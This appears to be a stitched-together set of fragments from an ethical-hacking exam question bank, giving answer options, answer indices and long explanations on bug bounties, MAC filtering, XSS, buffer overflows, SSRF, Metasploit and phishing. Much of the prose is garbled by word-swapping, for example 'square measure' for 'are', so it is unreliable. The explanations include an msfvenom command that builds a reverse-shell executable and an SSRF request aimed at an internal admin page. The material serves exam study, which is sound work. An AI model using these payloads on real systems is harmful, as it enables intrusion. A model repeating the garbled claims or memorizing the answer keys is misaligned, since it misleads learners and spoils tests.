hacker has to be the primary person to submit the bug to the program. meaning that in apply, you may pay weeks searching for a bug to use, solely to be the person to report it and build no cash. Roughly ninety seven of participants on major bug bounty platforms haven’t sold-out a bug. In fact, a 2019 report from HackerOne confirmed that out of quite three hundred,000 registered users, solely around two.5% received a bounty in their time on the platform. Essentially, most hackers are not creating a lot of cash on these platforms, and really few square measure creating enough to switch a full time wage (plus they do not have advantages like vacation days, insurance, and retirement planning). What square measure the disadvantages of bug bounty programs for organizations? These programs square measure solely helpful if the program ends up in the companies realizeing issues that they weren’t able to find themselves (and if they’ll fix those problems)! If the companies is not mature enough to be able to quickly rectify known problems, a bug bounty program is not the right alternative for his or her companies. Also, any bug bounty program is probably going to draw in an outsized range of submissions, several of which can not be high-quality submissions. a corporation must be ready to cope with the exaggerated volume of alerts, and also the risk of a coffee signal to noise magnitude relation (essentially that it’s probably that they’re going to receive quite few unhelpful reports for each useful report). Additionally, if the program does not attract enough participants (or participants with the incorrect talent set, and so participants are not able to establish any bugs), the program is not useful for the companies. The overwhelming majority of bug bounty participants consider web site vulnerabilities (72%, per HackerOn), whereas solely a number of (3.5%) value more highly to seek for package vulnerabilities. This is probably because of the actual fact that hacking in operation systems (like network hardware and memory) needs a big quantity of extremely specialised experience. this implies that firms may even see vital come on investment for bug bounties on websites, and not for alternative applications, notably those that need specialised experience. This conjointly implies that organizations which require to look at AN application or web site among a selected time-frame may not need to rely on a bug bounty as there is no guarantee of once or if they receive reports. Finally, it are often probably risky to permit freelance researchers to try to penetrate your network. this could end in public speech act of bugs, inflicting name harm within the limelight (which could end in individuals not eager to purchase the organizations’ product or service), or speech act of bugs to additional malicious third parties, United Nations agency may use this data to focus on the organization.

    "explanation": "https://en.wikipedia.org/wiki/MAC_filtering MAC filtering is a security method based on access control. Each address is assigned a 48-bit address, which is used to determine whether we can access a network or not. It helps in listing a set of allowed devices that you need on your Wi-Fi and the list of denied devices that you don’t want on your Wi-Fi. It helps in preventing unwanted access to the network. In a way, we can blacklist or white list certain computers based on their MAC address. We can configure the filter to allow connection only to those devices included in the white list. White lists provide greater security than blacklists because the router grants access only to selected devices. It is used on enterprise wireless networks having multiple access points to prevent clients from communicating with each other. The access point can be configured only to allow clients to talk to the default gateway, but not other wireless clients. It increases the efficiency of access to a network. The router allows configuring a list of allowed MAC addresses in its web interface, allowing you to choose which devices can connect to your network. The router has several functions designed to improve the network's security, but not all are useful. Media access control may seem advantageous, but there are certain flaws. On a wireless network, the device with the proper credentials such as SSID and password can authenticate with the router and join the network, which gets an IP address and access to the internet and any shared resources. MAC address filtering adds an extra layer of security that checks the device’s MAC address against a list of agreed addresses. If the client’s address matches one on the router’s list, access is granted; otherwise, it doesn’t join the network. "

    "explanation": "Social engineering is the term used for a broad range of malicious activities accomplished through human interactions. It uses psychological manipulation to trick users into making security mistakes or giving away sensitive information. Social engineering attacks typically involve some form of psychological manipulation, fooling otherwise unsuspecting users or employees into handing over confidential or sensitive data. Commonly, social engineering involves email or other communication that invokes urgency, fear, or similar emotions in the victim, leading the victim to promptly reveal sensitive information, click a malicious link, or open a malicious file. Because social engineering involves a human element, preventing these attacks can be tricky for enterprises. Incorrect answers: Tailgating and Piggybacking are the same thing Tailgating, sometimes referred to as piggybacking, is a physical security breach in which an unauthorized person follows an authorized individual to enter a secured premise. Tailgating provides a simple social engineering-based way around many security mechanisms one would think of as secure. Even retina scanners don't help if an employee holds the door for an unknown person behind them out of misguided courtesy. People who might tailgate include disgruntled former employees, thieves, vandals, mischief-makers, and issues with employees or the company. Any of these can disrupt business, cause damage, create unexpected costs, and lead to further safety issues. Eavesdropping https://en.wikipedia.org/wiki/Eavesdropping Eavesdropping is the act of secretly or stealthily listening to the private conversation or communications of others without their consent in order to gather information. Since the beginning of the digital age, the term has also come to hold great significance in the world of cybersecurity. The question does not specify at what level and how this attack is used. An attacker can eavesdrop on a conversation or use special software and obtain information on the network. There are many options, but this is not important because the correct answer is clearly not related to information interception. "

      "A": "Delete the wireless network",
      "B": "Remove all passwords",
      "C": "Lock all users",
      "D": "Disable SSID broadcasting"
    },
    "correct_answer": 3,
    "explanation": "The SSID (service set identifier) is the name of your wireless network. SSID broadcast is how your router transmits this name to surrounding devices. Its primary function is to make your network visible and easily accessible. Most routers broadcast their SSIDs automatically. To disable or enable SSID broadcast, you need to change your router’s settings. Disabling SSID broadcast will make your Wi-FI network name invisible to other users. However, this only hides the name, not the network itself. You cannot disguise the router's activity, so hackers can still attack it. With your network invisible to wireless devices, connecting becomes a bit more complicated. Just giving a Wi-FI password to your guests is no longer enough. They have to configure their settings manually by including the network name, security mode, and other relevant info. Disabling SSID might be a small step towards online security, but by no means should it be your final one. Before considering it as a security measure, consider the following aspects: - Disabling SSID broadcast will not hide your network completely Disabling SSID broadcast only hides the network name, not the fact that it exists. Your router constantly transmits so-called beacon frames to announce the presence of a wireless network. They contain essential information about the network and help the device connect. - Third-party software can easily trace a hidden network Programs such as NetStumbler or Kismet can easily locate hidden networks. You can try using them yourself to see how easy it is to find available networks –   hidden or not. - You might attract unwanted attention. Disabling your SSID broadcast could also raise suspicion. Most of us assume that when somebody hides something, they have a reason to do so. Thus, some hackers might be attracted to your network. "

    "explanation": "A NULL scan is a type of port scanning technique where the attacker sends a packet with no flags set (i.e., no SYN, ACK, FIN, or any other flag). According to the TCP protocol, different responses from the target system indicate the state of the port: 1) If the port is open, the correct behavior is that the target system will not respond at all. 2) If the port is closed, the system will typically respond with a RST (Reset) packet."

    "explanation": "https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on. Example for Windows: - msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe "

    "explanation": "There is no single, standardized classification of cross-site scripting flaws, but most experts distinguish between at least two primary flavors of XSS flaws: non- persistent and persistent. In this issue, we consider the non-persistent cross-site scripting vulnerability. The non-persistent (or reflected) cross-site scripting vulnerability is by far the most basic type of web vulnerability. These holes show up when the data provided by a web client, most commonly in HTTP query parameters (e.g. HTML form submission), is used immediately by server-side scripts to parse and display a page of results for and to that user, without properly sanitizing the content. Because HTML documents have a flat, serial structure that mixes control statements, formatting, and the actual content, any non-validated user-supplied data included in the resulting page without proper HTML encoding, may lead to markup injection. A classic example of a potential vector is a site search engine: if one searches for a string, the search string will typically be redisplayed verbatim on the result page to indicate what was searched for. If this response does not properly escape or reject HTML control characters, a cross-site scripting flaw will ensue. "

    "correct_answer": 2,
    "explanation": "Buffer overflow this attack is an anomaly that happens when software writing data to a buffer overflows the buffer’s capacity, leading to adjacent memory locations being overwritten. In other words, an excessive amount of information is being passed into a container that doesn’t have enough space, which information finishes up replacing data in adjacent containers.Buffer overflows are often exploited by attackers with a goal of modifying a computer’s memory so as to undermine or take hold of program execution. What’s a buffer?A buffer, or data buffer, is a neighborhood of physical memory storage wont to temporarily store data while it’s being moved from one place to a different . These buffers typically sleep in RAM memory. Computers frequently use buffers to assist improve performance; latest hard drives cash in of buffering to efficiently access data, and lots of online services also use buffers. for instance , buffers are frequently utilized in online video streaming to stop interruption. When a video is streamed, the video player downloads and stores perhaps 20% of the video at a time during a buffer then streams from that buffer. This way, minor drops in connection speed or quick service disruptions won’t affect the video stream performance.Buffers are designed to contain specific amounts of knowledge . Unless the program utilizing the buffer has built-in instructions to discard data when an excessive amount of is shipped to the buffer, the program will overwrite data in memory adjacent to the buffer.Buffer overflows are often exploited by attackers to corrupt software. Despite being well-understood, buffer overflow attacks are still a serious security problem that torment cyber-security teams. In 2014 a threat referred to as ‘heartbleed’ exposed many many users to attack due to a buffer overflow vulnerability in SSL software. How do attackers exploit buffer overflows?An attacker can deliberately feed a carefully crafted input into a program which will cause the program to undertake and store that input during a buffer that isn’t large enough, overwriting portions of memory connected to the buffer space. If the memory layout of the program is well- defined, the attacker can deliberately overwrite areas known to contain executable code. The attacker can then replace this code together with his own executable code, which may drastically change how the program is meant to figure .For example if the overwritten part in memory contains a pointer (an object that points to a different place in memory) the attacker’s code could replace that code with another pointer that points to an exploit payload. this will transfer control of the entire program over to theattacker’s code."

    "correct_answer": 2,
    "explanation": "A TCP/IP hijack is an attack that spoofs a server into thinking it’s talking with a sound client, once actually it’s communication with an assaulter that has condemned (or hijacked) the tcp session. Assume that the client has administrator-level privileges, which the attacker needs to steal that authority so as to form a brand new account with root-level access of the server to be used afterward. A tcp Hijacking is sort of a two-phased man-in-the-middle attack. The man-in-the- middle assaulter lurks within the circuit between a shopper and a server so as to work out what port and sequence numbers are being employed for the conversation. First, the attacker knocks out the client with an attack, like Ping of Death, or ties it up with some reasonably ICMP storm. This renders the client unable to transmit any packets to the server. Then, with the client crashed, the attacker assumes the client’s identity so as to talk with the server. By this suggests, the attacker gains administrator-level access to the server. One of the most effective means of preventing a hijack attack is to want a secret, that’s a shared secret between the shopper and also the server. looking on the strength of security desired, the key may be used for random exchanges. this is often once a client and server periodically challenge each other, or it will occur with each exchange, like Kerberos."

    "explanation": "https://en.wikipedia.org/wiki/Salt_(cryptography) A salt is random data that is used as an additional input to a one-way function that hashes data, a password, or passphrase. Salts are used to safeguard passwords in storage. Historically a password was stored in plaintext on a system, but over time additional safeguards were developed to protect a user's password against being read from the system. A salt is one of those methods. A new salt is randomly generated for each password. In a typical setting, the salt and the password (or its version after key stretching) are concatenated and processed with a cryptographic hash function, and the output hash value (but not the original password) is stored with the salt in a database. Hashing allows for later authentication without keeping and therefore risking exposure of the plaintext password in the event that the authentication data store is compromised. Salts defend against a pre-computed hash attack, e.g. rainbow tables. Since salts do not have to be memorized by humans they can make the size of the hash table required for a successful attack prohibitively large without placing a burden on the users. Since salts are different in each case, they also protect commonly used passwords, or those users who use the same password on several sites, by making all salted hash instances for the same password different from each other."

    "explanation": "https://en.wikipedia.org/wiki/Subnetwork This is a fairly simple question. You must to understand what a subnet mask is and how it works. A subnetwork or subnet is a logical subdivision of an IP network.The practice of dividing a network into two or more networks is called subnetting. Computers that belong to the same subnet are addressed with an identical most-significant bit-group in their IP addresses. This results in the logical division of an IP address into two fields: the network number or routing prefix and the rest field or host identifier. The rest field is an identifier for a specific host or network interface. The routing prefix may be expressed in Classless Inter-Domain Routing (CIDR) notation written as the first address of a network, followed by a slash character (/), and ending with the bit-length of the prefix. For example, 198.51.100.0/24 is the prefix of the Internet Protocol version 4 network starting at the given address, having 24 bits allocated for the network prefix, and the remaining 8 bits reserved for host addressing. Addresses in the range 198.51.100.0 to 198.51.100.255 belong to this network. The IPv6 address specification 2001:db8::/32 is a large address block with 296 addresses, having a 32-bit routing prefix. For IPv4, a network may also be characterized by its subnet mask or netmask, which is the bitmask that when applied by a bitwise AND operation to any IP address in the network, yields the routing prefix. Subnet masks are also expressed in dot-decimal notation like an address. For example, 255.255.255.0 is the subnet mask for the prefix 198.51.100.0/24. Table Description automatically generated"

It is owned by Boston, Massachusetts-based security company Rapid7. Its best-known sub-project is the open-source Metasploit Framework, a tool for developing and executing exploit code against a remote target machine. Other important sub-projects include the Opcode Database, shellcode archive and related research. The Metasploit Project includes anti-forensic and evasion tools, some of which are built into the Metasploit Framework. Metasploit is pre-installed in the Kali Linux operating system. The basic steps for exploiting a system using the Framework include. * 1. Optionally checking whether the intended target system is vulnerable to an exploit. * 2. Choosing and configuring an exploit (code that enters a target system by taking advantage of one of its bugs; about 900 different exploits for Windows, Unix/Linux and macOS systems are included). * 3. Choosing and configuring a payload (code that will be executed on the target system upon successful entry; for instance, a remote shell or a VNC server). Metasploit often recommends a payload that should work. * 4. Choosing the encoding technique so that hexadecimal opcodes known as \"bad characters\" are removed from the payload, these characters will cause the exploit to fail. * 5. Executing the exploit. This modular approach – allowing the combination of any exploit with any payload – is the major advantage of the Framework. It facilitates the tasks of attackers, exploit writers and payload writers."

    "explanation": "Passwords are usually delineated as “hashed and salted”. salting is simply the addition of a unique, random string of characters renowned solely to the site to every parole before it’s hashed, typically this “salt” is placed in front of each password. The salt value needs to be hold on by the site, which means typically sites use the same salt for each parole. This makes it less effective than if individual salts are used. The use of unique salts means that common passwords shared by multiple users – like “123456” or “password” – aren’t revealed revealed when one such hashed password is known – because despite the passwords being the same the immediately and hashed values are not. Large salts also protect against certain methods of attack on hashes, including rainbow tables or logs of hashed passwords previously broken. Both hashing and salting may be repeated more than once to increase the issue in breaking the security."

      "A": "B. Cleanup",
      "C": "Persistence",
      "D": "initial intrusion"
    },
    "correct_answer": 3,
    "explanation": "After the attacker completes preparations, subsequent step is an effort to realize an edge within the target’s environment. a particularly common entry tactic is that the use of spearphishing emails containing an internet link or attachment. Email links usually cause sites where the target’s browser and related software are subjected to varied exploit techniques or where the APT actors plan to social engineer information from the victim which will be used later. If a successful exploit takes place, it installs an initial malware payload on the victim’s computer. Figure 2 illustrates an example of a spearphishing email that contains an attachment. Attachments are usually executable malware, a zipper or other archive containing malware, or a malicious Office or Adobe PDF (Portable Document Format) document that exploits vulnerabilities within the victim’s applications to ultimately execute malware on the victim’s computer. Once the user has opened a malicious file using vulnerable software, malware is executing on the target system. These phishing emails are often very convincing and difficult to differentiate from legitimate email messages. Tactics to extend their believability include modifying legitimate documents from or associated with the organization. Documents are sometimes stolen from the organization or their collaborators during previous exploitation operations. Actors modify the documents by adding exploits and malicious code then send them to the victims. Phishing emails are commonly sent through previously compromised email servers, email accounts at organizations associated with the target or public email services. Emails also can be sent through mail relays with modified email headers to form the messages appear to possess originated from legitimate sources. Exploitation of vulnerabilities on public-facing servers is another favorite technique of some APT groups. Though this will be accomplished using exploits for known vulnerabilities, 0-days are often developed or purchased to be used in intrusions as required . Gaining an edge within the target environment is that the primary goal of the initial intrusion. Once a system is exploited, the attacker usually places malware on the compromised system and uses it as a jump point or proxy for further actions. Malware placed during the initial intrusion phase is usually an easy downloader, basic Remote Access Trojan or an easy shell. Figure 3 illustrates a newly infected system initiating an outbound connection to notify the APT actor that the initial intrusion attempt was successful which it’s able to accept commands."

      "D": "web cache poisoning attack"
    },
    "correct_answer": 1,
    "explanation": "Server-side request forgery (also called SSRF) is a net security vulnerability that allows an assaulter to induce the server-side application to make http requests to associate arbitrary domain of the attacker’s choosing. In typical SSRF examples, the attacker might cause the server to make a connection back to itself, or to other web-based services among the organization’s infrastructure, or to external third-party systems. Another type of trust relationship that often arises with server-side request forgery is where the application server is able to interact with different back-end systems that aren’t directly reachable by users. These systems typically have non-routable private informatics addresses. Since the back-end systems normally ordinarily protected by the topology, they typically have a weaker security posture. In several cases, internal back-end systems contain sensitive functionality that may be accessed while not authentication by anyone who is able to act with the systems. In the preceding example, suppose there’s an body interface at the back-end url https://192.168.0.68/admin. Here, an attacker will exploit the SSRF vulnerability to access the executive interface by submitting the following request: POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://192.168.0.68/admin"

      "C": "Key reinstallation attack",
      "D": "AP Myconfiguration"
    },
    "correct_answer": 0,
    "explanation": "Dragonblood allows an attacker in range of a password-protected Wi-Fi network to get the password and gain access to sensitive information like user credentials, emails and mastercard numbers. consistent with the published report:“The WPA3 certification aims to secure Wi-Fi networks, and provides several advantages over its predecessor WPA2, like protection against offline dictionary attacks and forward secrecy. Unfortunately, we show that WPA3 is suffering from several design flaws, and analyze these flaws both theoretically and practically. Most prominently, we show that WPA3’s Simultaneous Authentication of Equals (SAE) handshake, commonly referred to as Dragonfly, is suffering from password partitioning attacks.”Our Wi-Fi researchers at WatchGuard are educating businesses globally that WPA3 alone won’t stop the Wi-Fi hacks that allow attackers to steal information over the air (learn more in our recent blog post on the topic). These Dragonblood vulnerabilities impact alittle amount of devices that were released with WPA3 support, and makers are currently making patches available. one among the most important takeaways for businesses of all sizes is to know that a long-term fix might not be technically feasible for devices with lightweight processing capabilities like IoT and embedded systems. Businesses got to consider adding products that enable a Trusted Wireless Environment for all kinds of devices and users alike.Recognizing that vulnerabilities like KRACK and Dragonblood require attackers to initiate these attacks by bringing an “Evil Twin” Access Point or a Rogue Access Point into a Wi-Fi environment, we’ve been that specialize in developing Wi-Fi security solutions that neutralize these threats in order that these attacks can never occur. The Trusted Wireless Environment framework protects against the “Evil Twin” Access Point and Rogue Access Point. one among these hacks is required to initiate the 2 downgrade or side-channel attacks referenced in Dragonblood.What’s next? WPA3 is an improvement over WPA2 Wi-Fi encryption protocol, however, as we predicted, it still doesn’t provide protection from the six known Wi-Fi threat categories. It’s highly likely that we’ll see more WPA3 vulnerabilities announced within the near future.To help reduce Wi-Fi vulnerabilities, we’re asking all of you to hitch the Trusted Wireless Environment movement and advocate for a worldwide security standard for Wi-Fi."

    "explanation": "The host-based vulnerability assessment (VA) resolution arose from the auditors’ got to periodically review systems. Arising before the net becoming common, these tools typically take an “administrator’s eye” read of the setting by evaluating all of the knowledge that an administrator has at his or her disposal.

Then, it evaluates the chance of compromise. it should also live compliance to a predefined company policy so as to satisfy an annual audit. With administrator access, the scans area unit less possible to disrupt traditional operations since the computer code has the access it has to see into the complete configuration of the system. What it Measures Host VA tools will examine the native configuration tables and registries to spot not solely apparent vulnerabilities, however additionally “dormant” vulnerabilities – those weak or misconfigured systems and settings which will be exploited when an initial entry into the setting.

    "question": "Sam, a professional hacker. targeted an organization with intention of compromising AWS IAM credentials.

      "C": "Password reuse",
      "D": "Reverse engineering"
    },
    "correct_answer": 0,
    "explanation": "Just like any other service that accepts usernames and passwords for logging in, AWS users are vulnerable to social engineering attacks from attackers. fake emails, calls, or any other method of social engineering, may find yourself with an AWS users’ credentials within the hands of an attacker. If a user only uses API keys for accessing AWS, general phishing techniques could still use to gain access to other accounts or their pc itself, where the attacker may then pull the API keys for aforementioned AWS user. With basic opensource intelligence (OSINT), it’s usually simple to collect a list of workers of an organization that use AWS on a regular basis. This list will then be targeted with spear phishing to do and gather credentials. an easy technique may include an email that says your bill has spiked 500th within the past 24 hours, “click here for additional information”, and when they click the link, they’re forwarded to a malicious copy of the AWS login page designed to steal their credentials. An example of such an email will be seen within the screenshot below. it’s exactly like an email that AWS would send to you if you were to exceed the free tier limits, except for a few little changes. If you clicked on any of the highlighted regions within the screenshot, you’d not be taken to the official AWS web site and you’d instead be forwarded to a pretend login page setup to steal your credentials. These emails will get even more specific by playing a touch bit additional OSINT before causing them out. If an attacker was ready to discover your AWS account ID on-line somewhere, they could use methods we at rhino have free previously to enumerate what users and roles exist in your account with none logs contact on your side. they could use this list to more refine their target list, further as their emails to reference services they will know that you often use. For reference, the journal post for using AWS account IDs for role enumeration will be found here and the journal post for using AWS account IDs for user enumeration will be found here. During engagements at rhino, we find that phishing is one in all the fastest ways for us to achieve access to an AWS environment."
